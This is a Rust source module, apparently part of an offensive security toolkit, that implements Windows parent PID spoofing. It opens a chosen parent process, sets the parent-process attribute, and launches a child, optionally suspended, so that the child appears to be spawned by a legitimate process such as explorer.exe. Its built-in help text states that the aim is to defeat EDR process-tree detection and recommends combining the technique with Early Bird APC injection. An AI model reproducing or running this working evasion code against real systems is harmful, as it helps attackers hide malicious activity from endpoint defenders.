use crate::log::LogSink;

#[derive(Debug)]
pub struct PpidConfig {
    pub parent_pid: u32,
    pub child_command: String,
    pub suspended: bool,
}

#[derive(Debug)]
pub struct PpidResult {
    pub child_pid: u32,
    pub child_tid: u32,
    pub parent_pid: u32,
    pub suspended: bool,
}

pub fn find_pid_by_name(name: &str, log: &LogSink) -> Result<u32, String> {
    let procs = crate::process::scan(log);
    let matches = crate::process::filter(&procs, name);
    match matches.len() {
        0 => Err(format!("no process found matching '{name}'")),
        1 => Ok(matches[0].pid),
        n => {
            log.warning(format!(
                "  {n} processes match '{name}', using PID {}",
                matches[0].pid
            ));
            Ok(matches[0].pid)
        }
    }
}

pub fn dry_run(parent: &str, child: &str, log: &LogSink) {
    log.info(format!("[DRY RUN] PPID Spoofing"));
    log.detail(format!("  Parent: {parent}"));
    log.detail(format!("  Child: {child}"));
    log.info(String::new());
    log.detail("  Steps that would execute:".to_string());
    log.detail(format!("    [1/5] Resolve parent process ('{parent}')"));
    log.detail("    [2/5] OpenProcess(PROCESS_CREATE_PROCESS) on parent".to_string());
    log.detail("    [3/5] InitializeProcThreadAttributeList (1 attribute)".to_string());
    log.detail("    [4/5] UpdateProcThreadAttribute(PARENT_PROCESS)".to_string());
    log.detail(format!(
        "    [5/5] CreateProcessW(\"{child}\") with EXTENDED_STARTUPINFO_PRESENT"
    ));
    log.info(String::new());
    log.warning("  The child process will appear to have been spawned by the".to_string());
    log.warning("  specified parent. EDR process-tree analysis sees a legitimate".to_string());
    log.warning("  parent (e.g., explorer.exe) instead of the actual launcher.".to_string());
}

pub fn print_info(log: &LogSink) {
    log.info("=== PPID Spoofing ===".to_string());
    log.info(String::new());
    log.detail("Parent PID (PPID) spoofing creates a process that appears to".to_string());
    log.detail("have a different parent than its actual launcher. EDRs inspect".to_string());
    log.detail("process trees to detect suspicious parent-child relationships".to_string());
    log.detail("(e.g., cmd.exe spawned by word.exe). PPID spoofing defeats this.".to_string());
    log.info(String::new());
    log.detail("Technique: PROC_THREAD_ATTRIBUTE_PARENT_PROCESS".to_string());
    log.detail("  - Open the desired parent with PROCESS_CREATE_PROCESS access".to_string());
    log.detail("  - Create STARTUPINFOEXW with an attribute list".to_string());
    log.detail("  - UpdateProcThreadAttribute sets the parent handle".to_string());
    log.detail("  - CreateProcessW with EXTENDED_STARTUPINFO_PRESENT flag".to_string());
    log.info(String::new());
    log.detail("Combine with CREATE_SUSPENDED for Early Bird APC injection:".to_string());
    log.detail("  spawn suspended child with spoofed parent → inject → resume".to_string());
}

#[cfg(windows)]
pub fn spawn(config: &PpidConfig, log: &LogSink) -> Result<PpidResult, String> {
    use std::mem::{size_of, zeroed};
    use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
    use windows::Win32::System::Threading::{
        CreateProcessW, OpenProcess, EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
        PROCESS_INFORMATION, STARTUPINFOEXW,
        InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
        DeleteProcThreadAttributeList, LPPROC_THREAD_ATTRIBUTE_LIST,
        PROCESS_CREATE_PROCESS,
    };

    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

    log.step(format!(
        "[1/5] OpenProcess(PROCESS_CREATE_PROCESS, parent PID {})",
        config.parent_pid
    ));
    let parent_handle = unsafe {
        OpenProcess(PROCESS_CREATE_PROCESS, FALSE, config.parent_pid)
    }
    .map_err(|e| format!("OpenProcess on parent PID {} failed: {e}", config.parent_pid))?;

    log.step("[2/5] InitializeProcThreadAttributeList".to_string());
    let mut attr_size: usize = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut attr_size,
        );
    }
    if attr_size == 0 {
        let _ = unsafe { CloseHandle(parent_handle) };
        return Err("InitializeProcThreadAttributeList returned size 0".to_string());
    }

    let mut attr_buf: Vec<u8> = vec![0u8; attr_size];
    let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_buf.as_mut_ptr() as *mut _);

    unsafe {
        InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size)
    }
    .map_err(|e| {
        let _ = unsafe { CloseHandle(parent_handle) };
        format!("InitializeProcThreadAttributeList failed: {e}")
    })?;

    log.step("[3/5] UpdateProcThreadAttribute(PARENT_PROCESS)".to_string());
    let handle_ptr: *const HANDLE = &parent_handle;
    unsafe {
        UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            Some(handle_ptr as *const std::ffi::c_void),
            size_of::<HANDLE>(),
            None,
            None,
        )
    }
    .map_err(|e| {
        unsafe {
            DeleteProcThreadAttributeList(attr_list);
            let _ = CloseHandle(parent_handle);
        }
        format!("UpdateProcThreadAttribute failed: {e}")
    })?;

    log.step(format!(
        "[4/5] CreateProcessW(\"{}\") with EXTENDED_STARTUPINFO_PRESENT",
        config.child_command
    ));

    let mut si_ex: STARTUPINFOEXW = unsafe { zeroed() };
    si_ex.StartupInfo.cb = size_of::<STARTUPINFOEXW>() as u32;
    si_ex.lpAttributeList = attr_list;

    let mut creation_flags = EXTENDED_STARTUPINFO_PRESENT;
    if config.suspended {
        creation_flags |= CREATE_SUSPENDED;
    }

    let mut child_cmd: Vec<u16> = config
        .child_command
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let result = unsafe {
        CreateProcessW(
            None,
            windows::core::PWSTR(child_cmd.as_mut_ptr()),
            None,
            None,
            FALSE,
            creation_flags,
            None,
            None,
            &si_ex.StartupInfo,
            &mut pi,
        )
    };

    unsafe {
        DeleteProcThreadAttributeList(attr_list);
        let _ = CloseHandle(parent_handle);
    }

    result.map_err(|e| format!("CreateProcessW failed: {e}"))?;

    let child_pid = pi.dwProcessId;
    let child_tid = pi.dwThreadId;

    log.step(format!(
        "[5/5] Process created — child PID {child_pid}, TID {child_tid}"
    ));
    if config.suspended {
        log.info(format!(
            "  Child is SUSPENDED — ready for APC injection, then ResumeThread"
        ));
    }
    log.info(format!(
        "  ✓ PPID spoofed: child PID {child_pid} appears parented by PID {}",
        config.parent_pid
    ));

    let _ = unsafe { CloseHandle(pi.hProcess) };
    let _ = unsafe { CloseHandle(pi.hThread) };

    Ok(PpidResult {
        child_pid,
        child_tid,
        parent_pid: config.parent_pid,
        suspended: config.suspended,
    })
}

#[cfg(not(windows))]
pub fn spawn(config: &PpidConfig, log: &LogSink) -> Result<PpidResult, String> {
    log.warning(format!(
        "  PPID spoofing requires Windows. Would spawn '{}' as child of PID {}.",
        config.child_command, config.parent_pid
    ));
    Err("PPID spoofing is only available on Windows".to_string())
}
